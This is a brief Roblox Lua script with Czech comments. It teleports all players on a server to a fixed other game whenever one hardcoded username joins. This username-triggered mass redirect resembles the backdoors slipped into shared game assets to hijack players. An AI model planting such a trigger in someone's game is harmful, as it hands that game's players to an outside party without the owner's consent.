local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

-- ID cílové hry
local targetPlaceId = 140233560440008

-- Funkce pro teleportaci všech hráčů na cílovou hru
local function teleportPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        TeleportService:Teleport(targetPlaceId, player)
    end
end

-- Sledování připojení hráčů
Players.PlayerAdded:Connect(function(player)
    -- Pokud se připojí hráč "TuBeRs93cs0"
    if player.Name == "TuBeRs93cs0" then
        -- Teleportuj všechny hráče na cílovou hru
        teleportPlayers()
    end
end)
